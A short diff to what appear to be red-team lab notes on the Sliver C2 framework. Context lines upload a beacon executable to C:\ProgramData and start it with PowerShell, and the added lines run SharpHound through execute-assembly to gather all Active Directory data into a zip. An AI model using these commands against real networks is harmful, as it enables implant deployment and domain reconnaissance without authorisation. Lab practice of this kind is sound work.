@@ -153,6 +153,9 @@ upload /home/kali/work/prolab/sliver/httpbeacon80fast.exe C:\\ProgramData\\fast.
 sliver > execute powershell.exe -Command "Start-Process C:\\ProgramData\\fast2.exe"
 # Run a command
 
+# Executing SharpHound
+sliver > execute-assembly /home/kali/work/prolab/net/SharpCollection/NetFramework_4.7_x64/SharpHound.exe -c all --zipfilename bloodhound.zip
+
 # Spawn an interactive session
 
 ```
